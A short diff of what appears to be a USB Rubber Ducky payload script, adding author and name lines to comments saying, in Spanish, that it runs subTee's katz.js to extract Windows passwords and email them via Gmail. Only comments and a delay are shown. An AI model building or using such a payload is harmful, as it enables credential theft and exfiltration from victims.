@@ -1,3 +1,5 @@
+REM Author: KaoRz
+REM Name: duckykatz2gmail
 REM Este sencillo payload se encargará de ejecutar el script de subTee - katz.js
 REM para extraer las contraseñas de Windows y enviarlas por Gmail
 DELAY 3000
